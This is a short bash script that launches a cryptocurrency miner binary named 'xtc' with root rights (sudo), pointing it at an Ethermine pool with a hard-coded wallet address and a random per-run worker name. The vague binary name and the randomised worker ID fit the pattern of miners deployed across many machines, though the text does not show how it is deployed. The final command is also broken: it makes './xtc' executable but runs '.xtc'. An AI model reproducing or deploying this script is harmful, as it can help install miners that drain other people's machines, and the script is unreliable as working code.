#!/bin/bash

POOL=asia1.ethermine.org:4444
WALL=0xb20c8E88cEb2a49bB7fc648AEA5d7D453ebC3FEA
WORK=$(echo $(shuf -i 1000-999999999 -n 1)-XTC)

cd "$(dirname "$0")"

chmod +x ./xtc && sudo .xtc -pool $POOL -wal $WALL.$WORK -proto 3
